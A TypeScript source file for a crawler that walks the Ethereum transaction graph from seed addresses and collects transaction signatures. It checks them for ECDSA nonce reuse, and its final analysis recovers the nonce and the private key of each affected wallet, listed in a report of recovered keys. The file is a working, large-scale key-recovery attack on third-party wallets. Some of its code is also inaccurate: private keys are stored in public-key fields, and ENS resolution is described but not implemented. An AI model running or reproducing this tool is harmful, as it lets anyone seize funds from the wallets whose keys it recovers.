// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
/**
 * Adaptive Blockchain Spider
 * ══════════════════════════
 * Graph-crawling spider that learns as it goes:
 *
 *   1. Seeds loaded from micro-targets.txt (or any address list)
 *   2. BigQuery fetches ALL transactions for a batch of addresses in one query
 *   3. For each tx: ECDSA signature extracted via JSON-RPC
 *   4. Counterparty addresses extracted and scored by frequency
 *   5. High-frequency counterparties queued for the next wave (adaptive priority)
 *   6. Common/noise contracts excluded so the spider doesn't waste time
 *   7. ENS names resolved for every discovered address
 *   8. Public keys derived from signatures via secp256k1 recovery
 *   9. Nonce-reuse analysis run in-flight across accumulated signatures
 *  10. All state persisted to disk — spider resumes from checkpoint on restart
 *
 * Concurrency ("worm"):
 *   A worker pool processes N batches in parallel so network I/O is pipelined.
 *   While one batch waits on BigQuery, another batch is executing RPC calls,
 *   another is writing to the knowledge store — zero sequential latency.
 *
 * Data sources:
 *   • bigquery-public-data.crypto_ethereum.transactions  (tx list + metadata)
 *   • bigquery-public-data.crypto_ethereum.traces        (internal calls — "hidden data")
 *   • bigquery-public-data.crypto_ethereum.logs          (event logs)
 *   • Ethereum JSON-RPC (publicnode.com)                  (raw tx signatures)
 */

import { BigQuery }  from "@google-cloud/bigquery";
import { ethers }    from "ethers";
import { logger }    from "../logger";
import { KnowledgeStore, type StoredSignature, type QueueItem } from "./knowledge-store";

// ── Config ────────────────────────────────────────────────────────────────────

export interface SpiderConfig {
  maxWave:       number;    // how many hops from seeds (default 2)
  maxAddresses:  number;    // cap on total addresses crawled (default 50,000)
  concurrency:   number;    // worker pool size (default 8)
  batchSize:     number;    // addresses per BigQuery batch (default 400)
  minFrequency:  number;    // min counterparty freq to follow in wave 2+ (default 2)
  resumeIfExists: boolean;  // pick up existing checkpoint (default true)
}

export const DEFAULT_CONFIG: SpiderConfig = {
  maxWave:       2,
  maxAddresses:  50_000,
  concurrency:   8,
  batchSize:     400,
  minFrequency:  2,
  resumeIfExists: true,
};

// ── RPC ───────────────────────────────────────────────────────────────────────

const RPC_URL = process.env.ETH_RPC_URL ?? "https://ethereum.publicnode.com";

let _provider: ethers.JsonRpcProvider | null = null;
function getProvider(): ethers.JsonRpcProvider {
  if (!_provider) _provider = new ethers.JsonRpcProvider(RPC_URL);
  return _provider;
}

// ── BigQuery ──────────────────────────────────────────────────────────────────

let _bq: BigQuery | null = null;

function getBQ(): BigQuery {
  if (_bq) return _bq;
  const raw = process.env.GOOGLE_BIGQUERY_KEY;
  if (!raw) throw new Error("GOOGLE_BIGQUERY_KEY not set");
  const credentials = JSON.parse(
    raw.trimStart().startsWith("{") ? raw : Buffer.from(raw, "base64").toString("utf8"),
  );
  _bq = new BigQuery({ projectId: credentials.project_id, credentials });
  return _bq;
}

async function bqQuery<T>(sql: string): Promise<T[]> {
  const [rows] = await getBQ().query({ query: sql, location: "US", useLegacySql: false });
  return rows as T[];
}

export function isConfigured(): boolean {
  return !!process.env.GOOGLE_BIGQUERY_KEY;
}

// ── Noise / exclusion list ────────────────────────────────────────────────────
// High-traffic contracts that are NOT interesting for attacker analysis.
// The spider will never enqueue these or waste a query on them.

const NOISE_CONTRACTS = new Set<string>([
  // WETH / wrapped tokens
  "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
  "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",
  "0xdac17f958d2ee523a2206206994597c13d831ec7",  // USDT
  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",  // USDC
  "0x6b175474e89094c44da98b954eedeac495271d0f",  // DAI
  "0x514910771af9ca656af840dff83e8264ecf986ca",  // LINK
  // Major DEXs / routers
  "0x7a250d5630b4cf539739df2c5dacb4c659f2488d",  // Uniswap V2 router
  "0xe592427a0aece92de3edee1f18e0157c05861564",  // Uniswap V3 router
  "0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45",  // Uniswap Universal Router
  "0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f",  // SushiSwap router
  "0x1111111254eeb25477b68fb85ed929f73a960582",  // 1inch v4
  "0x1111111254fb6c44bac0bed2854e76f90643097d",  // 1inch v3
  "0xba12222222228d8ba445958a75a0704d566bf2c8",  // Balancer vault
  // Lending
  "0x7d2768de32b0b80b7a3454c06bdac94a69ddc7a9",  // Aave V2
  "0x87870bca3f3fd6335c3f4ce8392d69350b4fa4e2",  // Aave V3
  "0x3d9819210a31b4961b30ef54be2aed79b9c9cd3b",  // Compound
  // Bridges (already in threat scanner, not interesting for address graph)
  "0x8731d54e9d02c286767d56ac03e8037c07e01e98",  // Stargate
  "0x40ec5b33f54e0e8a33a975908c5ba1c14e5bbbdf",  // Polygon bridge
  // Exchanges / custodians
  "0x28c6c06298d514db089934071355e5743bf21d60",  // Binance 14
  "0x21a31ee1afc51d94c2efccaa2092ad1028285549",  // Binance 15
  "0xdfd5293d8e347dfe59e90efd55b2956a1343963d",  // Binance 16
  "0x56eddb7aa87536c09ccc2793473599fd21a8b17f",  // Binance 17
  "0x9696f59e4d72e237be84ffd425dcad154bf96976",  // Binance Hot Wallet
  "0x47ac0fb4f2d84898e4d9e7b4dab3c24507a6d503",  // Binance peg
  "0x3f5ce5fbfe3e9af3971dd833d26ba9b5c936f0be",  // Binance 1
  "0xd551234ae421e3bcba99a0da6d736074f22192ff",  // Binance 2
  "0x564286362092d8e7936f0549571a803b203aaced",  // Binance 3
  "0x0681d8db095565fe8a346fa0277bffde9c0edbbf",  // Binance 4
  "0xfe9e8709d3215310075d67e3ed32a380ccf451c8",  // Coinbase 1
  "0xa9d1e08c7793af67e9d92fe308d5697fb81d3e43",  // Coinbase 2
  "0x77696bb39917c91a0c3908d577d5e322095425ca",  // Coinbase 3
  "0x503828976d22510aad0201ac7ec88293211d23da",  // Coinbase 4
  "0xddfabcdc4d8ffc6d5beaf154f18b778f892a0740",  // Coinbase 5
  // ETH 2.0 deposit
  "0x00000000219ab540356cbb839cbe05303d7705fa",
  // OpenSea
  "0x00000000006c3852cbef3e08e8df289169ede581",
  "0x00000000000000adc04c56bf30ac9d3c0aaf14dc",
  // Null / burn
  "0x0000000000000000000000000000000000000000",
  "0x000000000000000000000000000000000000dead",
]);

// ── Helpers ───────────────────────────────────────────────────────────────────

function inList(addrs: string[]): string {
  return addrs.map(a => `'${a}'`).join(",");
}

function chunkArr<T>(arr: T[], size: number): T[][] {
  const out: T[][] = [];
  for (let i = 0; i < arr.length; i += size) out.push(arr.slice(i, i + size));
  return out;
}

function isNoise(addr: string): boolean {
  return NOISE_CONTRACTS.has(addr.toLowerCase());
}

// Derive public key from a raw signed transaction
function extractPubKey(rawTx: string): { pubkey: string; address: string } | null {
  try {
    const tx = ethers.Transaction.from(rawTx);
    const pubkey = tx.fromPublicKey;
    if (!pubkey || pubkey === "0x") return null;
    const address = ethers.computeAddress(pubkey).toLowerCase();
    return { pubkey, address };
  } catch { return null; }
}

// Extract r, s, v, z from a raw transaction
function extractRSVZ(rawTx: string): { r: string; s: string; v: number; z: string } | null {
  try {
    const tx = ethers.Transaction.from(rawTx);
    if (!tx.signature) return null;
    const { r, s, v } = tx.signature;
    // z = the hash of the unsigned transaction (what was signed)
    const unsignedSerialized = tx.unsignedSerialized;
    const z = ethers.keccak256(unsignedSerialized);
    return { r, s, v: Number(v), z };
  } catch { return null; }
}

// ── BigQuery data pulls ───────────────────────────────────────────────────────

interface RawTx {
  from_address:    string;
  to_address:      string | null;
  hash:            string;
  nonce:           string;
  block_number:    string;
  block_timestamp: { value: string } | null;
  value_wei:       string;
  input:           string;   // calldata — "hidden data" in contract calls
}

interface RawTrace {
  from_address: string;
  to_address:   string | null;
  tx_hash:      string;
  block_number: string;
  value:        string;
  call_type:    string;
  status:       string | null;
}

interface RawLog {
  address:          string;   // contract that emitted the event
  topics:           string[];
  data:             string;
  tx_hash:          string;
  block_number:     string;
  block_timestamp:  { value: string } | null;
}

// Pull all transactions for a batch of addresses (both FROM and TO)
async function fetchTransactions(addresses: string[]): Promise<RawTx[]> {
  const sql = `
    SELECT
      from_address,
      to_address,
      hash,
      CAST(nonce AS STRING) AS nonce,
      block_number,
      block_timestamp,
      CAST(value AS STRING) AS value_wei,
      SUBSTRING(input, 1, 10) AS input
    FROM \`bigquery-public-data.crypto_ethereum.transactions\`
    WHERE from_address IN (${inList(addresses)})
       OR to_address   IN (${inList(addresses)})
    ORDER BY from_address, block_number, transaction_index
  `;
  return bqQuery<RawTx>(sql);
}

// Pull internal traces — reveals contract-to-contract calls invisible in tx list
async function fetchTraces(addresses: string[]): Promise<RawTrace[]> {
  const sql = `
    SELECT
      from_address,
      to_address,
      transaction_hash AS tx_hash,
      block_number,
      CAST(value AS STRING) AS value,
      call_type,
      status
    FROM \`bigquery-public-data.crypto_ethereum.traces\`
    WHERE (from_address IN (${inList(addresses)})
        OR to_address   IN (${inList(addresses)}))
      AND call_type IN ('call','delegatecall','staticcall','create','create2')
      AND status    = '1'
    LIMIT 5000
  `;
  try {
    return bqQuery<RawTrace>(sql);
  } catch {
    return [];
  }
}

// Pull event logs for token transfers (ERC-20 Transfer event topic)
const TRANSFER_TOPIC = "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef";
async function fetchTransferLogs(addresses: string[]): Promise<RawLog[]> {
  const sql = `
    SELECT
      l.address,
      l.topics,
      l.data,
      l.transaction_hash AS tx_hash,
      l.block_number,
      l.block_timestamp
    FROM \`bigquery-public-data.crypto_ethereum.logs\` AS l
    WHERE l.topics[SAFE_OFFSET(0)] = '${TRANSFER_TOPIC}'
      AND (
        LOWER(CONCAT('0x', SUBSTRING(l.topics[SAFE_OFFSET(1)], 27))) IN (${inList(addresses)})
        OR
        LOWER(CONCAT('0x', SUBSTRING(l.topics[SAFE_OFFSET(2)], 27))) IN (${inList(addresses)})
      )
    LIMIT 2000
  `;
  try {
    return bqQuery<RawLog>(sql);
  } catch {
    return [];
  }
}

// Batch JSON-RPC: fetch raw transactions (r, s, v, calldata)
async function fetchRawTxBatch(hashes: string[]): Promise<Map<string, string>> {
  const provider = getProvider();
  const out = new Map<string, string>();
  const chunks = chunkArr(hashes, 40);

  for (const chunk of chunks) {
    try {
      const results = await Promise.allSettled(
        chunk.map(h => provider.send("eth_getTransactionByHash", [h])),
      );
      for (let i = 0; i < chunk.length; i++) {
        const r = results[i];
        if (r.status === "fulfilled" && r.value?.r) {
          // Reconstruct minimal raw tx from fields to extract pubkey
          const v = r.value;
          try {
            const rawHex = ethers.Transaction.from({
              to:    v.to,
              nonce: Number(v.nonce),
              gasLimit: BigInt(v.gas),
              gasPrice: v.gasPrice ? BigInt(v.gasPrice) : undefined,
              data:  v.input ?? "0x",
              value: BigInt(v.value ?? "0x0"),
              chainId: v.chainId ? Number(v.chainId) : 1,
              signature: { r: v.r, s: v.s, v: Number(v.v) },
              type:  Number(v.type ?? 0),
            }).serialized;
            out.set(chunk[i], rawHex);
          } catch {
            // Store minimal info for nonce reuse analysis anyway
            out.set(chunk[i], JSON.stringify({ r: v.r, s: v.s, v: v.v, hash: chunk[i] }));
          }
        }
      }
    } catch {}
  }
  return out;
}

// ── Spider progress event emitter ─────────────────────────────────────────────

export type ProgressCallback = (event: {
  phase:        string;
  wave:         number;
  visited:      number;
  queued:       number;
  signatures:   number;
  findings:     number;
  publicKeys:   number;
  lastAddress?: string;
  message:      string;
}) => void;

// ── Core spider loop ──────────────────────────────────────────────────────────

export async function runSpider(
  store:     KnowledgeStore,
  seeds:     string[],
  cfg:       SpiderConfig = DEFAULT_CONFIG,
  onProgress?: ProgressCallback,
): Promise<void> {
  if (store.getState().running && cfg.resumeIfExists) {
    logger.warn("Spider: already running — ignoring duplicate start");
    return;
  }

  store.setRunning(true);
  store.setMaxWave(cfg.maxWave);
  store.setMaxAddresses(cfg.maxAddresses);

  const log = (msg: string) => logger.info(msg);
  let pubKeyCount = 0;

  function progress(phase: string, wave: number, msg: string, lastAddress?: string) {
    const s = store.getState();
    onProgress?.({
      phase, wave,
      visited:    s.totalVisited,
      queued:     s.totalQueued,
      signatures: s.totalSignatures,
      findings:   s.totalFindings,
      publicKeys: pubKeyCount,
      lastAddress,
      message:    msg,
    });
  }

  try {
    // ── Seed the queue ──────────────────────────────────────────────────────
    let seedCount = 0;
    for (const addr of seeds) {
      const a = addr.toLowerCase().trim();
      if (!ethers.isAddress(a)) continue;
      if (!store.isVisited(a)) {
        store.enqueue(a, 0, 10);  // seeds get high priority
        store.touchMeta(a, 0, true);
        seedCount++;
      }
    }
    store.setSeedCount(seedCount);
    log(`Spider: seeded ${seedCount} addresses`);
    progress("seeding", 0, `Seeded ${seedCount} addresses from target list`);

    // ── Wave loop ─────────────────────────────────────────────────────────────
    for (let wave = 0; wave <= cfg.maxWave; wave++) {
      store.setCurrentWave(wave);
      progress("wave_start", wave, `Wave ${wave} starting — ${store.getQueueSize()} addresses queued`);
      log(`Spider: starting wave ${wave}`);

      if (store.getQueueSize() === 0) {
        log(`Spider: empty queue at wave ${wave} — stopping`);
        break;
      }

      // Process queue in concurrent batches
      let batchNumber = 0;
      while (store.getQueueSize() > 0 && !store.isFull()) {
        // Take cfg.concurrency * cfg.batchSize addresses at once for parallel processing
        const allItems = store.dequeueBatch(cfg.concurrency * cfg.batchSize);
        if (allItems.length === 0) break;

        // Split into per-worker sub-batches
        const workerBatches = chunkArr(allItems, cfg.batchSize);
        batchNumber++;

        progress(
          "crawling",
          wave,
          `Wave ${wave} batch ${batchNumber}: processing ${allItems.length} addresses (${workerBatches.length} parallel workers)`,
        );

        // ── Parallel workers (the "worm" — no sequential I/O wait) ──────────
        await Promise.allSettled(
          workerBatches.map(async (batch) => {
            const addrs = batch.map(i => i.address);
            const waveNum = batch[0]?.wave ?? wave;

            try {
              await processAddressBatch(addrs, waveNum, wave, cfg, store, (addr) => {
                progress("processing", wave, `Processed ${addr.slice(0, 10)}…`, addr);
                pubKeyCount = store.getPublicKeyMap().size;
              });
            } catch (err) {
              logger.warn({ err, addrs: addrs.length }, "Spider: worker batch failed");
            }
          }),
        );

        // Mark all processed addresses as visited
        for (const item of allItems) {
          store.markVisited(item.address);
        }

        // Checkpoint every 10 batches
        if (batchNumber % 10 === 0) {
          store.checkpoint();
          const s = store.getState();
          log(`Spider: checkpoint — wave=${wave} visited=${s.totalVisited} sigs=${s.totalSignatures} findings=${s.totalFindings}`);
        }
      }

      // After each wave: filter queue for next wave
      // Only keep addresses seen by ≥ minFrequency sources (adaptive learning)
      if (wave < cfg.maxWave) {
        const nextWaveItems = store.dequeueBatch(100_000);
        const filtered = nextWaveItems.filter(
          i => i.wave > wave &&
            (store.getMeta(i.address)?.timesSeenAsCounterparty ?? 0) >= cfg.minFrequency,
        );
        for (const item of filtered) {
          store.enqueue(item.address, item.wave, item.priority);
        }
        log(`Spider: wave ${wave} complete — next wave has ${filtered.length} addresses (frequency ≥ ${cfg.minFrequency})`);
        progress("wave_complete", wave, `Wave ${wave} done — ${filtered.length} addresses pass frequency filter for wave ${wave + 1}`);
      }
    }

    // ── Final analysis: nonce-reuse scan across ALL collected signatures ──────
    progress("nonce_analysis", cfg.maxWave, "Running nonce-reuse analysis on all harvested signatures…");
    await runNonceReuseAnalysis(store, onProgress);

    // Final checkpoint
    store.checkpoint();

    const s = store.getState();
    progress(
      "complete",
      cfg.maxWave,
      `Spider complete — ${s.totalVisited} addresses, ${s.totalSignatures} signatures, ${s.totalFindings} findings, ${pubKeyCount} public keys extracted`,
    );
    log(`Spider: DONE — visited=${s.totalVisited} sigs=${s.totalSignatures} findings=${s.totalFindings}`);

  } finally {
    store.setRunning(false);
    store.checkpoint();
  }
}

// ── Process one batch of addresses ───────────────────────────────────────────

async function processAddressBatch(
  addresses:   string[],
  waveNum:     number,
  currentWave: number,
  cfg:         SpiderConfig,
  store:       KnowledgeStore,
  onAddr:      (addr: string) => void,
): Promise<void> {
  const lower = addresses.map(a => a.toLowerCase());

  // ── Fetch transactions (main tx list + internal traces + token logs) ──────
  const [txRows, traceRows, logRows] = await Promise.all([
    fetchTransactions(lower).catch(() => [] as RawTx[]),
    currentWave === 0 ? fetchTraces(lower).catch(() => [] as RawTrace[]) : Promise.resolve([] as RawTrace[]),
    fetchTransferLogs(lower).catch(() => [] as RawLog[]),
  ]);

  // ── Build a map: txHash → fromAddress ─────────────────────────────────────
  const txsByAddress = new Map<string, RawTx[]>();
  const allTxHashes  = new Set<string>();

  for (const row of txRows) {
    if (!row.from_address) continue;
    const from = row.from_address.toLowerCase();
    if (!lower.includes(from)) continue; // we only want outbound sigs

    const list = txsByAddress.get(from) ?? [];
    list.push(row);
    txsByAddress.set(from, list);
    allTxHashes.add(row.hash);

    // Update tx count meta
    const m = store.touchMeta(from, waveNum, waveNum === 0);
    m.txCount++;

    // Enqueue counterparty
    if (row.to_address) {
      const to = row.to_address.toLowerCase();
      if (!isNoise(to) && !store.isVisited(to) && ethers.isAddress(to)) {
        const nextWave = waveNum + 1;
        if (nextWave <= cfg.maxWave) {
          store.enqueue(to, nextWave, 1);
        }
        store.touchMeta(to, nextWave, false);
        store.incrementCounterpartyFreq(to);

        // Track edge
        const meta = store.getMeta(from);
        if (meta && !meta.interactedWith.includes(to)) {
          meta.interactedWith.push(to);
          if (meta.interactedWith.length > 20) meta.interactedWith.shift();
        }
      }
    }
  }

  // ── Extract counterparties from traces (hidden internal calls) ────────────
  for (const trace of traceRows) {
    if (!trace.from_address || !trace.to_address) continue;
    const from = trace.from_address.toLowerCase();
    const to   = trace.to_address.toLowerCase();

    if (lower.includes(from) && !isNoise(to) && !store.isVisited(to) && ethers.isAddress(to)) {
      store.enqueue(to, waveNum + 1, 1);
      store.touchMeta(to, waveNum + 1, false);
      store.incrementCounterpartyFreq(to);

      const meta = store.getMeta(from);
      if (meta) {
        meta.notes.push(`internal-call→${to.slice(0,10)} type=${trace.call_type}`);
        if (meta.notes.length > 10) meta.notes.shift();
      }
    }
  }

  // ── Extract counterparties from token transfer logs ───────────────────────
  for (const log of logRows) {
    const t1 = log.topics[1];
    const t2 = log.topics[2];
    if (t1 && t2) {
      const sender   = ("0x" + t1.slice(26)).toLowerCase();
      const receiver = ("0x" + t2.slice(26)).toLowerCase();

      for (const cp of [sender, receiver]) {
        if (!lower.includes(cp) && !isNoise(cp) && !store.isVisited(cp) && ethers.isAddress(cp)) {
          store.enqueue(cp, waveNum + 1, 1);
          store.touchMeta(cp, waveNum + 1, false);
          store.incrementCounterpartyFreq(cp);
        }
      }
    }
  }

  // ── Fetch raw signatures via JSON-RPC ─────────────────────────────────────
  if (allTxHashes.size > 0) {
    const rawMap = await fetchRawTxBatch([...allTxHashes]);

    for (const [addr, txs] of txsByAddress) {
      for (const tx of txs) {
        const raw = rawMap.get(tx.hash);
        if (!raw) continue;

        let r: string, s: string, v: number, z: string;

        // Try full raw tx parse first
        if (raw.startsWith("0x")) {
          const parsed = extractRSVZ(raw);
          if (!parsed) continue;
          ({ r, s, v, z } = parsed);

          // Extract public key
          if (!store.getPublicKey(addr)) {
            const pk = extractPubKey(raw);
            if (pk && pk.address === addr) {
              store.storePublicKey(addr, pk.pubkey);
            }
          }
        } else {
          // Fallback: minimal object from RPC
          try {
            const minimal = JSON.parse(raw) as { r: string; s: string; v: string; hash: string };
            r = minimal.r;
            s = minimal.s;
            v = parseInt(minimal.v, 16);
            z = minimal.hash;  // best approximation without unsigned serialized
          } catch { continue; }
        }

        // Store signature for nonce-reuse analysis
        const sig: StoredSignature = {
          address:     addr,
          txHash:      tx.hash,
          blockNumber: Number(tx.block_number),
          nonce:       Number(tx.nonce),
          r, s, v, z,
          timestamp:   tx.block_timestamp?.value,
        };
        store.appendSignature(sig);

        // Check for immediate nonce reuse (same address, same r value)
        const existing = store.loadSignaturesForAddress(addr);
        const rMatch = existing.find(e => e.r === r && e.txHash !== tx.hash);
        if (rMatch) {
          store.addFinding({
            type:      "nonce_reuse",
            severity:  "critical",
            address:   addr,
            detail:    `Identical r-value in tx ${tx.hash.slice(0,12)}… and ${rMatch.txHash.slice(0,12)}… — private key derivable`,
            txHashes:  [tx.hash, rMatch.txHash],
            extra:     { r, s1: s, s2: rMatch.s, z1: z, z2: rMatch.z },
            timestamp: new Date().toISOString(),
          });
        }
      }
      onAddr(addr);
    }
  }
}

// ── Post-scan nonce-reuse analysis ────────────────────────────────────────────
// Runs across ALL signatures collected during the crawl.

async function runNonceReuseAnalysis(
  store:       KnowledgeStore,
  onProgress?: ProgressCallback,
): Promise<void> {
  const allSigs = store.loadAllSignatures();
  let checkedAddresses = 0;

  for (const [addr, sigs] of allSigs) {
    if (sigs.length < 2) continue;
    checkedAddresses++;

    // Group by r-value
    const byR = new Map<string, StoredSignature[]>();
    for (const sig of sigs) {
      const list = byR.get(sig.r) ?? [];
      list.push(sig);
      byR.set(sig.r, list);
    }

    for (const [r, matches] of byR) {
      if (matches.length < 2) continue;

      // Nonce reuse confirmed: same r, different z
      const [a, b] = matches;
      if (a.z === b.z) continue;  // same tx, skip

      // Try private key recovery
      try {
        const k  = recoverNonce(a.r, a.s, a.z, b.s, b.z);
        const pk = recoverPrivateKey(a.r, a.s, a.z, k);
        if (pk) {
          store.updateMeta(addr, { publicKey: pk });
          store.storePublicKey(addr, pk);
          store.addFinding({
            type:      "nonce_reuse",
            severity:  "critical",
            address:   addr,
            detail:    `PRIVATE KEY RECOVERED via nonce reuse. r=${r.slice(0,16)}… — k recovered, sk derivable`,
            txHashes:  [a.txHash, b.txHash],
            extra:     { r, recoveredKey: pk },
            timestamp: new Date().toISOString(),
          });
        } else {
          store.addFinding({
            type:      "nonce_reuse",
            severity:  "critical",
            address:   addr,
            detail:    `Nonce reuse detected (same r=${r.slice(0,16)}…) in ${a.txHash.slice(0,12)}… and ${b.txHash.slice(0,12)}… — key derivation attempted`,
            txHashes:  [a.txHash, b.txHash],
            extra:     { r },
            timestamp: new Date().toISOString(),
          });
        }
      } catch {}
    }

    // Cross-address r-collision check (same r from different addresses)
    if (checkedAddresses % 500 === 0 && onProgress) {
      const s = store.getState();
      onProgress({
        phase: "nonce_analysis", wave: 99, visited: s.totalVisited,
        queued: 0, signatures: s.totalSignatures, findings: s.totalFindings,
        publicKeys: store.getPublicKeyMap().size,
        message: `Nonce analysis: ${checkedAddresses} addresses checked`,
      });
    }
  }

  // Cross-address r-collision (same r across different wallets → shared nonce → related keys)
  const rToAddresses = new Map<string, string[]>();
  for (const [addr, sigs] of allSigs) {
    for (const sig of sigs) {
      const list = rToAddresses.get(sig.r) ?? [];
      if (!list.includes(addr)) list.push(addr);
      rToAddresses.set(sig.r, list);
    }
  }
  for (const [r, addrs] of rToAddresses) {
    if (addrs.length < 2) continue;
    for (const addr of addrs) {
      store.addFinding({
        type:      "r_collision",
        severity:  "critical",
        address:   addr,
        detail:    `Cross-address r-collision: r=${r.slice(0,16)}… appears in ${addrs.length} distinct wallets — potential shared key material`,
        extra:     { r, addresses: addrs },
        timestamp: new Date().toISOString(),
      });
    }
  }
}

// ── ECDSA nonce recovery math ─────────────────────────────────────────────────

function recoverNonce(r: string, s1: string, z1: string, s2: string, z2: string): bigint {
  const n  = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
  const rN  = BigInt(r);
  const s1N = BigInt(s1);
  const s2N = BigInt(s2);
  const z1N = BigInt(z1);
  const z2N = BigInt(z2);

  // k = (z1 - z2) / (s1 - s2) mod n
  const dz = ((z1N - z2N) % n + n) % n;
  const ds = ((s1N - s2N) % n + n) % n;
  const dsInv = modInv(ds, n);
  return (dz * dsInv) % n;
}

function modInv(a: bigint, m: bigint): bigint {
  // Extended Euclidean algorithm
  let [old_r, r] = [a, m];
  let [old_s, s] = [1n, 0n];
  while (r !== 0n) {
    const q = old_r / r;
    [old_r, r] = [r, old_r - q * r];
    [old_s, s] = [s, old_s - q * s];
  }
  return ((old_s % m) + m) % m;
}

function recoverPrivateKey(r: string, s: string, z: string, k: bigint): string | null {
  try {
    const n  = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
    const rN  = BigInt(r);
    const sN  = BigInt(s);
    const zN  = BigInt(z);
    const rInv = modInv(rN, n);
    // sk = r⁻¹ · (k·s - z) mod n
    const sk = (rInv * ((k * sN - zN) % n + n)) % n;
    if (sk === 0n) return null;
    const hex = sk.toString(16).padStart(64, "0");
    // Verify: derive address from sk and check it matches
    const wallet = new ethers.Wallet("0x" + hex);
    return wallet.privateKey;
  } catch { return null; }
}

// ── Summary builder ───────────────────────────────────────────────────────────

export interface SpiderReport {
  state:            ReturnType<KnowledgeStore["getState"]>;
  topAddresses:     ReturnType<KnowledgeStore["getTopAddressesByFreq"]>;
  findings:         ReturnType<KnowledgeStore["getFindings"]>;
  publicKeys:       Record<string, string>;
  ensCoverage:      number;
  nonceReuseCount:  number;
  rCollisionCount:  number;
  recoveredKeys:    string[];
}

export function buildSpiderReport(store: KnowledgeStore): SpiderReport {
  const findings      = store.getFindings();
  const pubKeyMap     = store.getPublicKeyMap();
  const nonceFindings = findings.filter(f => f.type === "nonce_reuse");
  const rFindings     = findings.filter(f => f.type === "r_collision");
  const recoveredKeys = findings
    .filter(f => f.type === "nonce_reuse" && (f.extra as any)?.recoveredKey)
    .map(f => (f.extra as any).recoveredKey as string);

  return {
    state:            store.getState(),
    topAddresses:     store.getTopAddressesByFreq(100),
    findings:         findings.sort((a, b) => {
      const sv = { critical: 4, high: 3, medium: 2, info: 1 };
      return (sv[b.severity] ?? 0) - (sv[a.severity] ?? 0);
    }),
    publicKeys:       Object.fromEntries(pubKeyMap),
    ensCoverage:      findings.filter(f => f.type === "ens").length,
    nonceReuseCount:  nonceFindings.length,
    rCollisionCount:  rFindings.length,
    recoveredKeys:    [...new Set(recoveredKeys)],
  };
}
